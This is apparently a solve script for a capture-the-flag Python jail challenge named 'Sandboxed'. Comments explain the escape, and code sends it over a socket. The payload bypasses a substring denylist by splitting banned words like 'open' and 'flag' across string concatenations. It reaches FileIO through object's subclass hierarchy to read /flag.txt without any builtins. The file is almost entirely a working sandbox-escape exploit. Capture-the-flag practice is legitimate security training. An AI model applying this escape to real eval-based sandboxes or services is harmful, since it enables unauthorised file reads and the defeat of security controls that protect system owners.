#!/usr/bin/env python3
# Solve for "Sandboxed" pyjail. Connect, send one escaping expression, read the flag.
#
# The jail eval's your expression with empty builtins after a substring denylist. builtins are
# gone, but the *type hierarchy* isn't: walk object's subclasses to reach a file class, and split
# the banned tokens ('open', 'flag') across string concatenations so they never appear literally.
#
# Intended escape (via the io type hierarchy - no builtins needed at all):
#   [c for c in [c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_IOBase'][0]
#    .__subclasses__() if c.__name__=='_RawIOBase'][0].__subclasses__()[0]('/'+'fl'+'ag.txt').read()
#   (that last subclass is FileIO; FileIO('/flag.txt').read() returns the bytes)
#
# usage: python3 solve.py <host> <port>
import sys, socket

PAYLOAD = ("[c for c in [c for c in ().__class__.__base__.__subclasses__() "
           "if c.__name__=='_IOBase'][0].__subclasses__() if c.__name__=='_RawIOBase'][0]"
           ".__subclasses__()[0]('/'+'fl'+'ag.txt').read()\n")

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9999
    s = socket.create_connection((host, port), timeout=10)
    s.recv(4096)                       # banner
    s.sendall(PAYLOAD.encode())
    data = s.recv(4096).decode(errors="replace")
    print(data.strip())
    s.close()

if __name__ == "__main__":
    main()
